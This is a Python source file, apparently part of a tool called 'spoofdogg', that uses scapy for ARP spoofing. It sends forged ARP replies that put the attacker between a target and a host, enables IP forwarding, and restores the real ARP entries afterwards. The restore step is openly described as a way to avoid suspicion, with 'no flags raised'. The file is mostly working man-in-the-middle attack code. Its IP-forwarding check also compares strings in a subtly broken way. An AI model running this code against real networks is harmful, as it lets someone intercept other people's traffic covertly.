from scapy.layers.l2 import Ether, ARP, srp
from scapy.all import send
import os
import sys


def get_mac(ip):
    """
    Gets the MAC address of the IP address.
    :param ip: IP address to get the MAC of.
    :return: MAC address of IP OR None
    """
    # Send the ARP request packet asking for the owner of the IP address
    # If IP is down ie. unused returns None
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


def _enable_ip_routing_windows():
    """
    Enables IP forwarding (routing) on Windows systems.
    """
    from services import WService
    service = WService("Remote Access")
    service.start()


def _enable_ip_routing_linux():
    """
    Enables IP forwarding (routing) on Linux systems. I'd just like to interject for a moment...
    """
    try:
        file_path = "/proc/sys/net/ipv4/ip_forward"  # File for IP forwarding on Linux based distros

        with open(file_path) as file:
            # Have no idea why "1" == "1" returns False but "1" > "1" returns True TODO: FIGURE IT OUT!!
            if file.read() > "1":  # IP forwarding is already enabled. No need fo further action.
                return
        with open(file_path, mode="w") as file:  # open the file in "w"rite mode
            print(1, file=file)
    except PermissionError:
        sys.exit("Access denied. Are you root? Try running spoofdogg with \"sudo\"")


def enable_ip_routing():
    """
    Enables IP routing for the particular OS.
    """
    print("[*] Enabling IP routing...")
    if "nt" in os.name:
        _enable_ip_routing_windows()
    else:
        _enable_ip_routing_linux()
    print("[*] IP routing enabled.")


def spoof(target, host):
    """
    Spoofs target IP by saying the attacker is the host IP
    :param target: Target of this spoof. Who are we reaching?
    :param host: IP the attacker is spoofing. Who are we?
    """
    target_mac = get_mac(target)

    # Craft the ARP response saying the attacker is the host.
    # No hwsrc specified because by default that's the attacker's MAC address
    arp_response = ARP(pdst=target, hwdst=target_mac, psrc=host, op="is-at")

    # Send the packet. Verbose=0 means we are sending without printing anything.
    send(arp_response, verbose=0)

    self_mac = ARP().hwsrc
    print("[->] Sent to {} : {} is-at {}".format(target, host, self_mac))


def restore(target, host):
    """
    Restores the normal process of a normal network by sending seven regular ARP packets.
    This is achieved by sending the original IP address and MAC of the gateway to the target.
    In the end everything looks as if nothing weird happened.
    If this is not called, the victim loses internet connection and that would be suspicious.

    TL:DR -> Everything back to normal, no flags raised.
    :param target: Target the attacker is trying to reach.
    :param host: The destination attacker is trying to reach
    """
    # Original information
    target_mac = get_mac(target)
    host_mac = get_mac(host)

    # Innocent ARP response
    arp_response = ARP(pdst=target, hwdst=target_mac, psrc=host, hwsrc=host_mac)

    # Send the innocent ARP packet to restore the network to its original condition.
    # Sent seven times for good measure
    send(arp_response, verbose=0, count=7)

    print("[->] Network restored")
    print("[->] Sent to {} : {} is-at {}".format(target, host, host_mac))
